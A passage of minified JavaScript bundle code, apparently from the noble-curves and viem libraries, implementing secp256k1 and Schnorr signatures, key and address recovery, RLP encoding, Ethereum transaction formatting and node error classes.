z=c,$=BigInt(3),H=BigInt(6),L=BigInt(11),V=BigInt(22),G=BigInt(23),Z=BigInt(44),J=BigInt(88),ne=j*j*j%z,re=ne*ne*j%z,le=(0,s.pow2)(re,$,z)*re%z,oe=(0,s.pow2)(le,$,z)*re%z,ue=(0,s.pow2)(oe,m,z)*ne%z,be=(0,s.pow2)(ue,L,z)*ue%z,Me=(0,s.pow2)(be,V,z)*be%z,Te=(0,s.pow2)(Me,Z,z)*Me%z,Oe=(0,s.pow2)(Te,J,z)*Te%z,Ke=(0,s.pow2)(Oe,Z,z)*Me%z,it=(0,s.pow2)(Ke,$,z)*re%z,at=(0,s.pow2)(it,G,z)*be%z,At=(0,s.pow2)(at,H,z)*ne%z,Et=(0,s.pow2)(At,m,z);if(!y.eql(y.sqr(Et),j))throw new Error("Cannot find square root");return Et}const y=(0,s.Field)(c,void 0,void 0,{sqrt:w});t.secp256k1=(0,r.createCurve)({a:f,b:BigInt(7),Fp:y,n:l,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:j=>{const z=l,$=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),H=-h*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),L=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),V=$,G=BigInt("0x100000000000000000000000000000000"),Z=b(V*j,z),J=b(-H*j,z);let ne=(0,s.mod)(j-Z*$-J*L,z),re=(0,s.mod)(-Z*H-J*V,z);const le=ne>G,oe=re>G;if(le&&(ne=z-ne),oe&&(re=z-re),ne>G||re>G)throw new Error("splitScalar: Endomorphism failed, k="+j);return{k1neg:le,k1:ne,k2neg:oe,k2:re}}}},e.sha256);const E={};function A(j,...z){let $=E[j];if($===void 0){const H=(0,e.sha256)(Uint8Array.from(j,L=>L.charCodeAt(0)));$=(0,o.concatBytes)(H,H),E[j]=$}return(0,e.sha256)((0,o.concatBytes)($,...z))}const R=j=>j.toRawBytes(!0).slice(1),S=j=>(0,o.numberToBytesBE)(j,32),v=j=>(0,s.mod)(j,c),k=j=>(0,s.mod)(j,l),O=t.secp256k1.ProjectivePoint,_=(j,z,$)=>O.BASE.multiplyAndAddUnsafe(j,z,$);function I(j){let z=t.secp256k1.utils.normPrivateKeyToScalar(j),$=O.fromPrivateKey(z);return{scalar:$.hasEvenY()?z:k(-z),bytes:R($)}}function T(j){(0,o.aInRange)("x",j,h,c);const z=v(j*j),$=v(z*j+BigInt(7));let H=w($);H%m!==f&&(H=v(-H));const L=new O(j,H,h);return L.assertValidity(),L}const B=o.bytesToNumberBE;function U(...j){return k(B(A("BIP0340/challenge",...j)))}function M(j){return I(j).bytes}function N(j,z,$=(0,n.randomBytes)(32)){const H=(0,o.ensureBytes)("message",j),{bytes:L,scalar:V}=I(z),G=(0,o.ensureBytes)("auxRand",$,32),Z=S(V^B(A("BIP0340/aux",G))),J=A("BIP0340/nonce",Z,L,H),ne=k(B(J));if(ne===f)throw new Error("sign failed: k is zero");const{bytes:re,scalar:le}=I(ne),oe=U(re,L,H),ue=new Uint8Array(64);if(ue.set(re,0),ue.set(S(k(le+oe*V)),32),!q(ue,H,L))throw new Error("sign: Invalid signature produced");return ue}function q(j,z,$){const H=(0,o.ensureBytes)("signature",j,64),L=(0,o.ensureBytes)("message",z),V=(0,o.ensureBytes)("publicKey",$,32);try{const G=T(B(V)),Z=B(H.subarray(0,32));if(!(0,o.inRange)(Z,h,c))return!1;const J=B(H.subarray(32,64));if(!(0,o.inRange)(J,h,l))return!1;const ne=U(S(Z),R(G),L),re=_(G,J,k(-ne));return!(!re||!re.hasEvenY()||re.toAffine().x!==Z)}catch{return!1}}t.schnorr={getPublicKey:M,sign:N,verify:q,utils:{randomPrivateKey:t.secp256k1.utils.randomPrivateKey,lift_x:T,pointToBytes:R,numberToBytesBE:o.numberToBytesBE,bytesToNumberBE:o.bytesToNumberBE,taggedHash:A,mod:s.mod}};const P=(0,i.isogenyMap)(y,[["0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa8c7","0x7d3d4c80bc321d5b9f315cea7fd44c5d595d2fc0bf63b92dfff1044f17c6581","0x534c328d23f234e6e2a413deca25caece4506144037c40314ecbd0b53d9dd262","0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa88c"],["0xd35771193d94918a9ca34ccbb7b640dd86cd409542f8487d9fe6b745781eb49b","0xedadc6f64383dc1df7c4b2d51b54225406d36b641f5e41bbc52a56612a8c6d14","0x0000000000000000000000000000000000000000000000000000000000000001"],["0x4bda12f684bda12f684bda12f684bda12f684bda12f684bda12f684b8e38e23c","0xc75e0c32d5cb7c0fa9d0a54b12a0a6d5647ab046d686da6fdffc90fc201d71a3","0x29a6194691f91a73715209ef6512e576722830a201be2018a765e85a9ecee931","0x2f684bda12f684bda12f684bda12f684bda12f684bda12f684bda12f38e38d84"],["0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffff93b","0x7a06534bb8bdb49fd5e9e6632722c2989467c1bfc8e8d978dfb425d2685c2573","0x6484aa716545ca2cf3a70c3fa8fe337e0a3d21162f0d6299a7bf8192bfd2a76f","0x0000000000000000000000000000000000000000000000000000000000000001"]].map(j=>j.map(z=>BigInt(z)))),C=(0,a.mapToCurveSimpleSWU)(y,{A:BigInt("0x3f8731abdd661adca08a5558f0f5d272e953d363cb6f0e5d405447c01a444533"),B:BigInt("1771"),Z:y.create(BigInt("-11"))});t.secp256k1_hasher=(0,i.createHasher)(t.secp256k1.ProjectivePoint,j=>{const{x:z,y:$}=C(y.create(j[0]));return P(z,$)},{DST:"secp256k1_XMD:SHA-256_SSWU_RO_",encodeDST:"secp256k1_XMD:SHA-256_SSWU_NU_",p:y.ORDER,m:1,k:128,expand:"xmd",hash:e.sha256}),t.hashToCurve=t.secp256k1_hasher.hashToCurve,t.encodeToCurve=t.secp256k1_hasher.encodeToCurve})(GO)),GO}var gY;function zj(){if(gY)return Q6;gY=1,Object.defineProperty(Q6,"__esModule",{value:!0}),Q6.recoverPublicKey=i;const t=So(),e=fa(),n=ci(),r=lt();async function i({hash:o,signature:a}){const c=(0,t.isHex)(o)?o:(0,r.toHex)(o),{secp256k1:l}=await Promise.resolve().then(()=>uy());return`0x${(()=>{if(typeof a=="object"&&"r"in a&&"s"in a){const{r:y,s:E,v:A,yParity:R}=a,S=Number(R??A),v=s(S);return new l.Signature((0,n.hexToBigInt)(y),(0,n.hexToBigInt)(E)).addRecoveryBit(v)}const m=(0,t.isHex)(a)?a:(0,r.toHex)(a);if((0,e.size)(m)!==65)throw new Error("invalid signature length");const b=(0,n.hexToNumber)(`0x${m.slice(130)}`),w=s(b);return l.Signature.fromCompact(m.substring(2,130)).addRecoveryBit(w)})().recoverPublicKey(c.substring(2)).toHex(!1)}`}function s(o){if(o===0||o===1)return o;if(o===27)return 0;if(o===28)return 1;throw new Error("Invalid yParityOrV value")}return Q6}var yY;function u0(){if(yY)return Z6;yY=1,Object.defineProperty(Z6,"__esModule",{value:!0}),Z6.recoverAddress=n;const t=fle(),e=zj();async function n({hash:r,signature:i}){return(0,t.publicKeyToAddress)(await(0,e.recoverPublicKey)({hash:r,signature:i}))}return Z6}var J6={},Eb={},bY;function MA(){if(bY)return Eb;bY=1,Object.defineProperty(Eb,"__esModule",{value:!0}),Eb.toRlp=i,Eb.bytesToRlp=s,Eb.hexToRlp=o;const t=Kt(),e=DA(),n=yr(),r=lt();function i(h,m="hex"){const b=a(h),w=(0,e.createCursor)(new Uint8Array(b.length));return b.encode(w),m==="hex"?(0,r.bytesToHex)(w.bytes):w.bytes}function s(h,m="bytes"){return i(h,m)}function o(h,m="hex"){return i(h,m)}function a(h){return Array.isArray(h)?c(h.map(m=>a(m))):l(h)}function c(h){const m=h.reduce((y,E)=>y+E.length,0),b=f(m);return{length:m<=55?1+m:1+b+m,encode(y){m<=55?y.pushByte(192+m):(y.pushByte(247+b),b===1?y.pushUint8(m):b===2?y.pushUint16(m):b===3?y.pushUint24(m):y.pushUint32(m));for(const{encode:E}of h)E(y)}}}function l(h){const m=typeof h=="string"?(0,n.hexToBytes)(h):h,b=f(m.length);return{length:m.length===1&&m[0]<128?1:m.length<=55?1+m.length:1+b+m.length,encode(y){m.length===1&&m[0]<128?y.pushBytes(m):m.length<=55?(y.pushByte(128+m.length),y.pushBytes(m)):(y.pushByte(183+b),b===1?y.pushUint8(m.length):b===2?y.pushUint16(m.length):b===3?y.pushUint24(m.length):y.pushUint32(m.length),y.pushBytes(m))}}}function f(h){if(h<2**8)return 1;if(h<2**16)return 2;if(h<2**24)return 3;if(h<2**32)return 4;throw new t.BaseError("Length is too large.")}return Eb}var wY;function gle(){if(wY)return J6;wY=1,Object.defineProperty(J6,"__esModule",{value:!0}),J6.hashAuthorization=s;const t=os(),e=yr(),n=lt(),r=MA(),i=ha();function s(o){const{chainId:a,nonce:c,to:l}=o,f=o.contractAddress??o.address,h=(0,i.keccak256)((0,t.concatHex)(["0x05",(0,r.toRlp)([a?(0,n.numberToHex)(a):"0x",f,c?(0,n.numberToHex)(c):"0x"])]));return l==="bytes"?(0,e.hexToBytes)(h):h}return J6}var vY;function UA(){if(vY)return K6;vY=1,Object.defineProperty(K6,"__esModule",{value:!0}),K6.recoverAuthorizationAddress=n;const t=u0(),e=gle();async function n(r){const{authorization:i,signature:s}=r;return(0,t.recoverAddress)({hash:(0,e.hashAuthorization)(i),signature:s??i})}return K6}var X6={},m2={},EY;function yle(){if(EY)return m2;EY=1,Object.defineProperty(m2,"__esModule",{value:!0}),m2.EstimateGasExecutionError=void 0;const t=jA(),e=ay(),n=Kt(),r=ga();class i extends n.BaseError{constructor(o,{account:a,docsPath:c,chain:l,data:f,gas:h,gasPrice:m,maxFeePerGas:b,maxPriorityFeePerGas:w,nonce:y,to:E,value:A}){const R=(0,r.prettyPrint)({from:a?.address,to:E,value:typeof A<"u"&&`${(0,t.formatEther)(A)} ${l?.nativeCurrency?.symbol||"ETH"}`,data:f,gas:h,gasPrice:typeof m<"u"&&`${(0,e.formatGwei)(m)} gwei`,maxFeePerGas:typeof b<"u"&&`${(0,e.formatGwei)(b)} gwei`,maxPriorityFeePerGas:typeof w<"u"&&`${(0,e.formatGwei)(w)} gwei`,nonce:y});super(o.shortMessage,{cause:o,docsPath:c,metaMessages:[...o.metaMessages?[...o.metaMessages," "]:[],"Estimate Gas Arguments:",R].filter(Boolean),name:"EstimateGasExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=o}}return m2.EstimateGasExecutionError=i,m2}var pr={},_Y;function Jf(){if(_Y)return pr;_Y=1,Object.defineProperty(pr,"__esModule",{value:!0}),pr.UnknownNodeError=pr.TipAboveFeeCapError=pr.TransactionTypeNotSupportedError=pr.IntrinsicGasTooLowError=pr.IntrinsicGasTooHighError=pr.InsufficientFundsError=pr.NonceMaxValueError=pr.NonceTooLowError=pr.NonceTooHighError=pr.FeeCapTooLowError=pr.FeeCapTooHighError=pr.ExecutionRevertedError=void 0;const t=ay(),e=Kt();class n extends e.BaseError{constructor({cause:y,message:E}={}){const A=E?.replace("execution reverted: ","")?.replace("execution reverted","");super(`Execution reverted ${A?`with reason: ${A}`:"for an unknown reason"}.`,{cause:y,name:"ExecutionRevertedError"})}}pr.ExecutionRevertedError=n,Object.defineProperty(n,"code",{enumerable:!0,configurable:!0,writable:!0,value:3}),Object.defineProperty(n,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class r extends e.BaseError{constructor({cause:y,maxFeePerGas:E}={}){super(`The fee cap (\`maxFeePerGas\`${E?` = ${(0,t.formatGwei)(E)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:y,name:"FeeCapTooHighError"})}}pr.FeeCapTooHighError=r,Object.defineProperty(r,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class i extends e.BaseError{constructor({cause:y,maxFeePerGas:E}={}){super(`The fee cap (\`maxFeePerGas\`${E?` = ${(0,t.formatGwei)(E)}`:""} gwei) cannot be lower than the block base fee.`,{cause:y,name:"FeeCapTooLowError"})}}pr.FeeCapTooLowError=i,Object.defineProperty(i,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/});class s extends e.BaseError{constructor({cause:y,nonce:E}={}){super(`Nonce provided for the transaction ${E?`(${E}) `:""}is higher than the next one expected.`,{cause:y,name:"NonceTooHighError"})}}pr.NonceTooHighError=s,Object.defineProperty(s,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too high/});class o extends e.BaseError{constructor({cause:y,nonce:E}={}){super([`Nonce provided for the transaction ${E?`(${E}) `:""}is lower than the current nonce of the account.`,"Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`),{cause:y,name:"NonceTooLowError"})}}pr.NonceTooLowError=o,Object.defineProperty(o,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too low|transaction already imported|already known/});class a extends e.BaseError{constructor({cause:y,nonce:E}={}){super(`Nonce provided for the transaction ${E?`(${E}) `:""}exceeds the maximum allowed nonce.`,{cause:y,name:"NonceMaxValueError"})}}pr.NonceMaxValueError=a,Object.defineProperty(a,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce has max value/});class c extends e.BaseError{constructor({cause:y}={}){super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`),{cause:y,metaMessages:["This error could arise when the account does not have enough funds to:"," - pay for the total gas fee,"," - pay for the value to send."," ","The cost of the transaction is calculated as `gas * gas fee + value`, where:"," - `gas` is the amount of gas needed for transaction to execute,"," - `gas fee` is the gas fee,"," - `value` is the amount of ether to send to the recipient."],name:"InsufficientFundsError"})}}pr.InsufficientFundsError=c,Object.defineProperty(c,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/insufficient funds|exceeds transaction sender account balance/});class l extends e.BaseError{constructor({cause:y,gas:E}={}){super(`The amount of gas ${E?`(${E}) `:""}provided for the transaction exceeds the limit allowed for the block.`,{cause:y,name:"IntrinsicGasTooHighError"})}}pr.IntrinsicGasTooHighError=l,Object.defineProperty(l,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too high|gas limit reached/});class f extends e.BaseError{constructor({cause:y,gas:E}={}){super(`The amount of gas ${E?`(${E}) `:""}provided for the transaction is too low.`,{cause:y,name:"IntrinsicGasTooLowError"})}}pr.IntrinsicGasTooLowError=f,Object.defineProperty(f,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too low/});class h extends e.BaseError{constructor({cause:y}){super("The transaction type is not supported for this chain.",{cause:y,name:"TransactionTypeNotSupportedError"})}}pr.TransactionTypeNotSupportedError=h,Object.defineProperty(h,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/transaction type not valid/});class m extends e.BaseError{constructor({cause:y,maxPriorityFeePerGas:E,maxFeePerGas:A}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${E?` = ${(0,t.formatGwei)(E)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${A?` = ${(0,t.formatGwei)(A)} gwei`:""}).`].join(`
`),{cause:y,name:"TipAboveFeeCapError"})}}pr.TipAboveFeeCapError=m,Object.defineProperty(m,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});class b extends e.BaseError{constructor({cause:y}){super(`An error occurred while executing: ${y?.shortMessage}`,{cause:y,name:"UnknownNodeError"})}}return pr.UnknownNodeError=b,pr}var g2={},AY;function LA(){if(AY)return g2;AY=1,Object.defineProperty(g2,"__esModule",{value:!0}),g2.containsNodeError=i,g2.getNodeError=s;const t=Kt(),e=Jf(),n=Zu(),r=a0();function i(o){return o instanceof r.TransactionRejectedRpcError||o instanceof r.InvalidInputRpcError||o instanceof n.RpcRequestError&&o.code===e.ExecutionRevertedError.code}function s(o,a){const c=(o.details||"").toLowerCase(),l=o instanceof t.BaseError?o.walk(f=>f?.code===e.ExecutionRevertedError.code):o;return l instanceof t.BaseError?new e.ExecutionRevertedError({cause:o,message:l.details}):e.ExecutionRevertedError.nodeMessage.test(c)?new e.ExecutionRevertedError({cause:o,message:o.details}):e.FeeCapTooHighError.nodeMessage.test(c)?new e.FeeCapTooHighError({cause:o,maxFeePerGas:a?.maxFeePerGas}):e.FeeCapTooLowError.nodeMessage.test(c)?new e.FeeCapTooLowError({cause:o,maxFeePerGas:a?.maxFeePerGas}):e.NonceTooHighError.nodeMessage.test(c)?new e.NonceTooHighError({cause:o,nonce:a?.nonce}):e.NonceTooLowError.nodeMessage.test(c)?new e.NonceTooLowError({cause:o,nonce:a?.nonce}):e.NonceMaxValueError.nodeMessage.test(c)?new e.NonceMaxValueError({cause:o,nonce:a?.nonce}):e.InsufficientFundsError.nodeMessage.test(c)?new e.InsufficientFundsError({cause:o}):e.IntrinsicGasTooHighError.nodeMessage.test(c)?new e.IntrinsicGasTooHighError({cause:o,gas:a?.gas}):e.IntrinsicGasTooLowError.nodeMessage.test(c)?new e.IntrinsicGasTooLowError({cause:o,gas:a?.gas}):e.TransactionTypeNotSupportedError.nodeMessage.test(c)?new e.TransactionTypeNotSupportedError({cause:o}):e.TipAboveFeeCapError.nodeMessage.test(c)?new e.TipAboveFeeCapError({cause:o,maxFeePerGas:a?.maxFeePerGas,maxPriorityFeePerGas:a?.maxPriorityFeePerGas}):new e.UnknownNodeError({cause:o})}return g2}var CY;function ble(){if(CY)return X6;CY=1,Object.defineProperty(X6,"__esModule",{value:!0}),X6.getEstimateGasError=r;const t=yle(),e=Jf(),n=LA();function r(i,{docsPath:s,...o}){const a=(()=>{const c=(0,n.getNodeError)(i,o);return c instanceof e.UnknownNodeError?i:c})();return new t.EstimateGasExecutionError(a,{docsPath:s,...o})}return X6}var eC={},SY;function l0(){if(SY)return eC;SY=1,Object.defineProperty(eC,"__esModule",{value:!0}),eC.extract=t;function t(e,{format:n}){if(!n)return{};const r={};function i(o){const a=Object.keys(o);for(const c of a)c in e&&(r[c]=e[c]),o[c]&&typeof o[c]=="object"&&!Array.isArray(o[c])&&i(o[c])}const s=n(e||{});return i(s),r}return eC}var YO={},tC={},TY;function FA(){if(TY)return tC;TY=1,Object.defineProperty(tC,"__esModule",{value:!0}),tC.defineFormatter=t;function t(e,n){return({exclude:r,format:i})=>({exclude:r,format:(s,o)=>{const a=n(s,o);if(r)for(const c of r)delete a[c];return{...a,...i(s,o)}},type:e})}return tC}var xY;function Yu(){return xY||(xY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.defineTransactionRequest=t.rpcTransactionType=void 0,t.formatTransactionRequest=r;const e=lt(),n=FA();t.rpcTransactionType={legacy:"0x0",eip2930:"0x1",eip1559:"0x2",eip4844:"0x3",eip7702:"0x4"};function r(s,o){const a={};return typeof s.authorizationList<"u"&&(a.authorizationList=i(s.authorizationList)),typeof s.accessList<"u"&&(a.accessList=s.accessList),typeof s.blobVersionedHashes<"u"&&(a.blobVersionedHashes=s.blobVersionedHashes),typeof s.blobs<"u"&&(typeof s.blobs[0]!="string"?a.blobs=s.blobs.map(c=>(0,e.bytesToHex)(c)):a.blobs=s.blobs),typeof s.data<"u"&&(a.data=s.data),s.account&&(a.from=s.account.address),typeof s.from<"u"&&(a.from=s.from),typeof s.gas<"u"&&(a.gas=(0,e.numberToHex)(s.gas)),typeof s.gasPrice<"u"&&(a.gasPrice=(0,e.numberToHex)(s.gasPrice)),typeof s.maxFeePerBlobGas<"u"&&(a.maxFeePerBlobGas=(0,e.numberToHex)(s.maxFeePerBlobGas)),typeof s.maxFeePerGas<"u"&&(a.maxFeePerGas=(0,e.numberToHex)(s.maxFeePerGas)),typeof s.maxPriorityFeePerGas<"u"&&(a.maxPriorityFeePerGas=(0,e.numberToHex)(s.maxPriorityFeePerGas)),typeof s.nonce<"u"&&(a.nonce=(0,e.numberToHex)(s.nonce)),typeof s.to<"u"&&(a.to=s.to),typeof s.type<"u"&&(a.type=t.rpcTransactionType[s.type]),typeof s.value<"u"&&(a.value=(0,e.numberToHex)(s.value)),a}t.defineTransactionRequest=(0,n.defineFormatter)("transactionRequest",r);function i(s){return s.map(o=>({address:o.address,r:o.r?(0,e.numberToHex)(BigInt(o.r)):o.r,s:o.s?(0,e.numberToHex)(BigInt(o.s)):o.s,chainId:(0,e.numberToHex)(o.chainId),nonce:(0,e.numberToHex)(o.nonce),...typeof o.yParity<"u"?{yParity:(0,e.numberToHex)(o.yParity)}:{},...typeof o.v<"u"&&typeof o.yParity>"u"?{v:(0,e.numberToHex)(o.v)}:{}}))}})(YO)),YO}var _b={},IY;function qj(){if(IY)return _b;IY=1,Object.defineProperty(_b,"__esModule",{value:!0}),_b.serializeStateMapping=s,_b.serializeAccountStateOverride=o,_b.serializeStateOverride=a;const t=Gu(),e=M8(),n=$j(),r=pa(),i=lt();function s(c){if(!(!c||c.length===0))return c.reduce((l,{slot:f,value:h})=>{if(f.length!==66)throw new e.InvalidBytesLengthError({size:f.length,targetSize:66,type:"hex"});if(h.length!==66)throw new e.InvalidBytesLengthError({size:h.length,targetSize:66,type:"hex"});return l[f]=h,l},{})}function o(c){const{balance:l,nonce:f,state:h,stateDiff:m,code:b}=c,w={};if(b!==void 0&&(w.code=b),l!==void 0&&(w.balance=(0,i.numberToHex)(l)),f!==void 0&&(w.nonce=(0,i.numberToHex)(f)),h!==void 0&&(w.state=s(h)),m!==void 0){if(w.state)throw new n.StateAssignmentConflictError;w.stateDiff=s(m)}return w}function a(c){if(!c)return;const l={};for(const{address:f,...h}of c){if(!(0,r.isAddress)(f,{strict:!1}))throw new t.InvalidAddressError({address:f});if(l[f])throw new n.AccountStateConflictError({address:f});l[f]=o(h)}return l}return _b}var nC={},me={},RY;function Vj(){return RY||(RY=1,Object.defineProperty(me,"__esModule",{value:!0}),me.minInt144=me.minInt136=me.minInt128=me.minInt120=me.minInt112=me.minInt104=me.minInt96=me.minInt88=me.minInt80=me.minInt72=me.minInt64=me.minInt56=me.minInt48=me.minInt40=me.minInt32=me.minInt24=me.minInt16=me.minInt8=me.maxInt256=me.maxInt248=me.maxInt240=me.maxInt232=me.maxInt224=me.maxInt216=me.maxInt208=me.maxInt200=me.maxInt192=me.maxInt184=me.maxInt176=me.maxInt168=me.maxInt160=me.maxInt152=me.maxInt144=me.maxInt136=me.maxInt128=me.maxInt120=me.maxInt112=me.maxInt104=me.maxInt96=me.maxInt88=me.maxInt80=me.maxInt72=me.maxInt64=me.maxInt56=me.maxInt48=me.maxInt40=me.maxInt32=me.maxInt24=me.maxInt16=me.maxInt8=void 0,me.maxUint256=me.maxUint248=me.maxUint240=me.maxUint232=me.maxUint224=me.maxUint216=me.maxUint208=me.maxUint200=me.maxUint192=me.maxUint184=me.maxUint176=me.maxUint168=me.maxUint160=me.maxUint152=me.maxUint144=me.maxUint136=me.maxUint128=me.maxUint120=me.maxUint112=me.maxUint104=me.maxUint96=me.maxUint88=me.maxUint80=me.maxUint72=me.maxUint64=me.maxUint56=me.maxUint48=me.maxUint40=me.maxUint32=me.maxUint24=me.maxUint16=me.maxUint8=me.minInt256=me.minInt248=me.minInt240=me.minInt232=me.minInt224=me.minInt216=me.minInt208=me.minInt200=me.minInt192=me.minInt184=me.minInt176=me.minInt168=me.minInt160=me.minInt152=void 0,me.maxInt8=2n**(8n-1n)-1n,me.maxInt16=2n**(16n-1n)-1n,me.maxInt24=2n**(24n-1n)-1n,me.maxInt32=2n**(32n-1n)-1n,me.maxInt40=2n**(40n-1n)-1n,me.maxInt48=2n**(48n-1n)-1n,me.maxInt56=2n**(56n-1n)-1n,me.maxInt64=2n**(64n-1n)-1n,me.maxInt72=2n**(72n-1n)-1n,me.maxInt80=2n**(80n-1n)-1n,me.maxInt88=2n**(88n-1n)-1n,me.maxInt96=2n**(96n-1n)-1n,me.maxInt104=2n**(104n-1n)-1n,me.maxInt112=2n**(112n-1n)-1n,me.maxInt120=2n**(120n-1n)-1n,me.maxInt128=2n**(128n-1n)-1n,me.maxInt136=2n**(136n-1n)-1n,me.maxInt144=2n**(144n-1n)-1n,me.maxInt152=2n**(152n-1n)-1n,me.maxInt160=2n**(160n-1n)-1n,me.maxInt168=2n**(168n-1n)-1n,me.maxInt176=2n**(176n-1n)-1n,me.maxInt184=2n**(184n-1n)-1n,me.maxInt192=2n**(192n-1n)-1n,me.maxInt200=2n**(200n-1n)-1n,me.maxInt208=2n**(208n-1n)-1n,me.maxInt216=2n**(216n-1n)-1n,me.maxInt224=2n**(224n-1n)-1n,me.maxInt232=2n**(232n-1n)-1n,me.maxInt240=2n**(240n-1n)-1n,me.maxInt248=2n**(248n-1n)-1n,me.maxInt256=2n**(256n-1n)-1n,me.minInt8=-(2n**(8n-1n)),me.minInt16=-(2n**(16n-1n)),me.minInt24=-(2n**(24n-1n)),me.minInt32=-(2n**(32n-1n)),me.minInt40=-(2n**(40n-1n)),me.minInt48=-(2n**(48n-1n)),me.minInt56=-(2n**(56n-1n)),me.minInt64=-(2n**(64n-1n)),me.minInt72=-(2n**(72n-1n)),me.minInt80=-(2n**(80n-1n)),me.minInt88=-(2n**(88n-1n)),me.minInt96=-(2n**(96n-1n)),me.minInt104=-(2n**(104n-1n)),me.minInt112=-(2n**(112n-1n)),me.minInt120=-(2n**(120n-1n)),me.minInt128=-(2n**(128n-1n)),me.minInt136=-(2n**(136n-1n)),me.minInt144=-(2n**(144n-1n)),me.minInt152=-(2n**(152n-1n)),me.minInt160=-(2n**(160n-1n)),me.minInt168=-(2n**(168n-1n)),me.minInt176=-(2n**(176n-1n)),me.minInt184=-(2n**(184n-1n)),me.minInt192=-(2n**(192n-1n)),me.minInt200=-(2n**(200n-1n)),me.minInt208=-(2n**(208n-1n)),me.minInt216=-(2n**(216n-1n)),me.minInt224=-(2n**(224n-1n)),me.minInt232=-(2n**(232n-1n)),me.minInt240=-(2n**(240n-1n)),me.minInt248=-(2n**(248n-1n)),me.minInt256=-(2n**(256n-1n)),me.maxUint8=2n**8n-1n,me.maxUint16=2n**16n-1n,me.maxUint24=2n**24n-1n,me.maxUint32=2n**32n-1n,me.maxUint40=2n**40n-1n,me.maxUint48=2n**48n-1n,me.maxUint56=2n**56n-1n,me.maxUint64=2n**64n-1n,me.maxUint72=2n**72n-1n,me.maxUint80=2n**80n-1n,me.maxUint88=2n**88n-1n,me.maxUint96=2n**96n-1n,me.maxUint104=2n**104n-1n,me.maxUint112=2n**112n-1n,me.maxUint120=2n**120n-1n,me.maxUint128=2n**128n-1n,me.maxUint136=2n**136n-1n,me.maxUint144=2n**144n-1n,me.maxUint152=2n**152n-1n,me.maxUint160=2n**160n-1n,me.maxUint168=2n**168n-1n,me.maxUint176=2n**176n-1n,me.maxUint184=2n**184n-1n,me.maxUint192=2n**192n-1n,me.maxUint200=2n**200n-1n,me.maxUint208=2n**208n-1n,me.maxUint216=2n**216n-1n,me.maxUint224=2n**224n-1n,me.maxUint232=2n**232n-1n,me.maxUint240=2n**240n-1n,me.maxUint248=2n**248n-1n,me.maxUint256=2n**256n-1n),me}var PY;function Qu(){if(PY)return nC;PY=1,Object.defineProperty(nC,"__esModule",{value:!0}),nC.assertRequest=s;const t=Qr(),e=Vj(),n=Gu(),r=Jf(),i=pa();function s(o){const{account:a,maxFeePerGas:c,maxPriorityFeePerGas:l,to:f}=o,h=a?(0,t.parseAccount)(a):void 0;if(h&&!(0,i.isAddress)(h.address))throw new n.InvalidAddressError({address:h.address});if(f&&!(0,i.isAddress)(f))throw new n.InvalidAddressError({address:f});if(c&&c>e.maxUint256)throw new r.FeeCapTooHighError({maxFeePerGas:c});if(l&&c&&l>c)throw new r.TipAboveFeeCapError({maxFeePerGas:c,maxPriorityFeePerGas:l})}return nC}var QO={},y2={},tf={},NY;function $A(){if(NY)return tf;NY=1,Object.defineProperty(tf,"__esModule",{value:!0}),tf.MaxFeePerGasTooLowError=tf.Eip1559FeesNotSupportedError=tf.BaseFeeScalarError=void 0;const t=ay(),e=Kt();class n extends e.BaseError{constructor(){super("`baseFeeMultiplier` must be greater than 1.",{name:"BaseFeeScalarError"})}}tf.BaseFeeScalarError=n;class r extends e.BaseError{constructor(){super("Chain does not support EIP-1559 fees.",{name:"Eip1559FeesNotSupportedError"})}}tf.Eip1559FeesNotSupportedError=r;class i extends e.BaseError{constructor({maxPriorityFeePerGas:o}){super(`\`maxFeePerGas\` cannot be less than the \`maxPriorityFeePerGas\` (${(0,t.formatGwei)(o)} gwei).`,{name:"MaxFeePerGasTooLowError"})}}return tf.MaxFeePerGasTooLowError=i,tf}var b2={},rC={},w2={},OY;function Wj(){if(OY)return w2;OY=1,Object.defineProperty(w2,"__esModule",{value:!0}),w2.BlockNotFoundError=void 0;const t=Kt();class e extends t.BaseError{constructor({blockHash:r,blockNumber:i}){let s="Block";r&&(s=`Block at hash "${r}"`),i&&(s=`Block at number "${i}"`),super(`${s} could not be found.`,{name:"BlockNotFoundError"})}}return w2.BlockNotFoundError=e,w2}var Ab={},JO={},kY;function ww(){return kY||(kY=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.defineTransaction=t.transactionType=void 0,t.formatTransaction=r;const e=ci(),n=FA();t.transactionType={"0x0":"legacy","0x1":"eip2930","0x2":"eip1559","0x3":"eip4844","0x4":"eip7702"};function r(s,o){const 